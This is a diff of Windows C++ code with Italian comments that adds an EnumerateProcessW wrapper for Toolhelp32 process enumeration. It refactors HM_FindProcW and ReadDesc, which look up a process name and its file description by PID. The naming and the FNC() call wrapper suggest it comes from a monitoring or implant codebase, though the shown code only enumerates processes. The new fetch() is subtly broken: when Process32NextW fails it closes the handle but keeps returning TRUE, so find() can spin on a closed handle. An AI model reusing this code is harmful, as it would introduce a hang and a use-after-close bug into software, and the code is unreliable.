@@ -57,6 +57,70 @@ struct EnumerateProcess
 
 };
 
+struct EnumerateProcessW
+{
+	HANDLE hHandle;
+	PROCESSENTRY32W pe32;
+
+	EnumerateProcessW()
+		: hHandle(NULL)
+	{
+	}
+
+	~EnumerateProcessW()
+	{
+		if (hHandle != INVALID_HANDLE_VALUE && hHandle != NULL) {
+			CloseHandle(hHandle);
+			hHandle = NULL;
+		}
+	}
+
+	BOOL fetch() {
+		if (hHandle == NULL) {
+			memset(&pe32, 0, sizeof(PROCESSENTRY32W));
+			pe32.dwSize = sizeof(PROCESSENTRY32W);
+			hHandle = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
+
+			if (!FNC(Process32FirstW)(hHandle, &pe32)) {
+				CloseHandle(hHandle);
+				hHandle = INVALID_HANDLE_VALUE;
+				return FALSE;
+			}
+			return TRUE;
+		}
+		else if (hHandle == INVALID_HANDLE_VALUE) {
+		}
+		else {
+			if (FNC(Process32NextW)(hHandle, &pe32) == FALSE) {
+				CloseHandle(hHandle);
+			}
+		}
+
+		if (hHandle == INVALID_HANDLE_VALUE || hHandle == NULL)
+			return FALSE;
+
+		return TRUE;
+	}
+
+	bool find(DWORD dwPid) {
+		while (fetch()) {
+			if (pe32.th32ProcessID == dwPid)
+				return true;
+		}
+
+		return false;
+	}
+
+	bool operator() () {
+		if (fetch() == FALSE)
+			return false;
+
+		return true;
+	}
+
+
+};
+
 typedef struct {
 	HWND proc_window;
 	DWORD pid;
@@ -124,37 +188,23 @@ char* HM_FindProc(DWORD pid)
 // N.B. Se torna una stringa, va liberata
 WCHAR* HM_FindProcW(DWORD pid)
 {
-	HANDLE hProcessSnap;
-	PROCESSENTRY32W pe32;
 	DWORD dwPID = 0;
 	WCHAR* name_offs;
 	WCHAR* ret_name = NULL;
 
-	pe32.dwSize = sizeof(pe32);
-	if ((hProcessSnap = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
-		return NULL;
+	EnumerateProcessW proc;
 
-	if (!FNC(Process32FirstW)(hProcessSnap, &pe32)) {
-		CloseHandle(hProcessSnap);
-		return NULL;
+	while (proc.find(pid)) {
+		// Elimina il path
+		name_offs = wcsrchr(proc.pe32.szExeFile, L'\\');
+		if (!name_offs)
+			name_offs = proc.pe32.szExeFile;
+		else
+			name_offs++;
+		ret_name = _wcsdup(name_offs);
+		break;
 	}
 
-	// Cicla la lista dei processi attivi
-	do {
-		// Cerca il processo "pid"
-		if (pe32.th32ProcessID == pid) {
-			// Elimina il path
-			name_offs = wcsrchr(pe32.szExeFile, L'\\');
-			if (!name_offs)
-				name_offs = pe32.szExeFile;
-			else
-				name_offs++;
-			ret_name = _wcsdup(name_offs);
-			break;
-		}
-	} while (FNC(Process32NextW)(hProcessSnap, &pe32));
-
-	CloseHandle(hProcessSnap);
 	return ret_name;
 }
 
@@ -171,30 +221,31 @@ static BOOL HM_FindProcPath(DWORD pid, LPWSTR lpFilename, DWORD len)
 	return (n != 0) ? TRUE : FALSE;
 }
 
+typedef struct {
+	WORD wLanguage;
+	WORD wCodePage;
+} LANGANDCODEPAGE;
+
 // Ritorna la descrizione di un processo dato il PID
 BOOL ReadDesc(DWORD pid, WCHAR* file_desc, DWORD len)
 {
-	HRESULT hr;
-	DWORD size, dummy;
-	BYTE* pBlock;
 	UINT cbTranslate = 0, desc_size = 0;
 	WCHAR* description;
 	WCHAR file_path[MAX_PATH];
-	BOOL ret_val;
 	BYTE SubBlock[100];
-	struct LANGANDCODEPAGE {
-		WORD wLanguage;
-		WORD wCodePage;
-	} *lpTranslate;
+	
+	LANGANDCODEPAGE *lpTranslate;
 
 	if (!HM_FindProcPath(pid, file_path, sizeof(file_path)))
 		return FALSE;
 
-	size = GetFileVersionInfoSizeW(file_path, &dummy);
+	DWORD dummy = 0;
+	DWORD size = GetFileVersionInfoSizeW(file_path, &dummy);
 	if (size == 0)
 		return FALSE;
 
-	pBlock = (BYTE*)malloc(size);
+	BYTE* pBlock = (BYTE*)malloc(size);
+	
 	if (!pBlock)
 		return FALSE;
 
@@ -203,27 +254,24 @@ BOOL ReadDesc(DWORD pid, WCHAR* file_desc, DWORD len)
 		return FALSE;
 	}
 
-	ret_val = VerQueryValueW(pBlock, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate);
-	if (!ret_val || cbTranslate < sizeof(struct LANGANDCODEPAGE)) {
+	BOOL r = VerQueryValueW(pBlock, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate);
+	if (!r|| cbTranslate < sizeof(LANGANDCODEPAGE)) {
 		free(pBlock);
 		return FALSE;
 	}
 
 	ZeroMemory(SubBlock, sizeof(SubBlock));
-	hr = StringCchPrintfW((STRSAFE_LPWSTR)SubBlock, sizeof(SubBlock) - 1, L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
-	if (FAILED(hr)) {
-		free(pBlock);
-		return FALSE;
-	}
-
-	if (VerQueryValueW(pBlock, (LPCWSTR)SubBlock, (LPVOID*)&description, &desc_size)) {
-		_snwprintf_s(file_desc, len / sizeof(WCHAR), _TRUNCATE, L"%s", description);
-		free(pBlock);
-		return TRUE;
+	HRESULT hr = StringCchPrintfW((STRSAFE_LPWSTR)SubBlock, sizeof(SubBlock) - 1, L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
+	r = FALSE;
+	if (SUCCEEDED(hr)) {
+		if (VerQueryValueW(pBlock, (LPCWSTR)SubBlock, (LPVOID*)&description, &desc_size)) {
+			_snwprintf_s(file_desc, len / sizeof(WCHAR), _TRUNCATE, L"%s", description);
+			r = TRUE;
+		}
 	}
 
 	free(pBlock);
-	return FALSE;
+	return r;
 }
 
 // Torna TRUE se il processo e' dell'utente
